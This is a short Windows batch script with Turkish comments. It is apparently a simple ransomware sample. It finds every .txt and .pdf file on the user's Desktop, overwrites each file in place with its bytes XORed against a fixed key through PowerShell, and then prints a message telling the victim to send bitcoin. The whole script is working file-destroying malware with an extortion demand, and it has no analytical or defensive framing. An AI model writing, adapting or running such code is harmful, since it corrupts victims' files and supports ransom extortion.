@echo off
setlocal EnableDelayedExpansion

REM XOR key
set "key=AA"

REM Masaüstü yolu
set "desktop=%USERPROFILE%\Desktop"

REM Dosya listesi oluştur (txt ve pdf)
set "filelist=%temp%\files.txt"
del "%filelist%" 2>nul

for %%x in (txt pdf) do (
    dir /b /a:-d "%desktop%\*.%%x" >> "%filelist%"
)

REM XOR şifreleme fonksiyonu (PowerShell üzerinden çağrılıyor)
for /f "usebackq delims=" %%f in ("%filelist%") do (
    set "filepath=%desktop%\%%f"
    echo Şifreleniyor: !filepath!
    powershell -Command ^
        "$file='!filepath!';" ^
        "$key=0xAA;" ^
        "$bytes=[System.IO.File]::ReadAllBytes($file);" ^
        "for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key };" ^
        "[System.IO.File]::WriteAllBytes($file, $bytes);"
)

echo Tüm dosyalar şifrelendi! BTC gönder.
pause
